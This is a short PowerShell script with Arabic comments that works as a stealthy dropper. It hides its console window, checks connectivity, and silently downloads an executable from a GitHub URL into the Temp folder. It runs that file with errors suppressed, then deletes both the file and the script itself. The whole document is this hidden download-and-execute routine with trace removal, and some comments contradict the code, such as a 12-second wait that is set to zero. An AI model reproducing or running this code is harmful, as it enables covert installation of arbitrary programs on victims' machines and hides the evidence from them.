# إخفاء نافذة الـ PowerShell Console
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
	$consolePtr = [Console.Window]::GetConsoleWindow()
	[Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console

# وظيفة للتحقق من وجود الإنترنت بدون أي نوافذ أو إشعارات
function Test-InternetConnection
{
	try
	{
		Test-Connection -ComputerName google.com -Count 1 -Quiet
	}
	catch
	{
		return $false
	}
}

# وظيفة لتحميل وتشغيل البرنامج بدون نوافذ
function Download-And-Run-Program
{
	$url = 'https://github.com/armandolionel/sokamoka1/raw/refs/heads/main/solosquad4321.exe' # رابط برنامجك
	$outputFile = [System.IO.Path]::Combine($env:Temp, 'solosquad4321.exe')
	
	# تحقق من وجود اتصال إنترنت
	if (Test-InternetConnection)
	{
		try
		{
			Start-Sleep -Seconds 0 # انتظر 12 ثانية قبل التحميل
			Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction SilentlyContinue
			Start-Process -FilePath $outputFile -NoNewWindow -ErrorAction SilentlyContinue
			Start-Sleep -Seconds 0 # انتظر لفترة قصيرة لضمان تشغيل البرنامج
			Remove-Item -LiteralPath $outputFile -Force -ErrorAction SilentlyContinue # حذف الملف بعد تشغيله
			Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue # حذف السكربت نفسه إذا كان مطلوبًا
		}
		catch { }
	}
}

# تشغيل وظيفة التحميل بدون أي نوافذ
Download-And-Run-Program
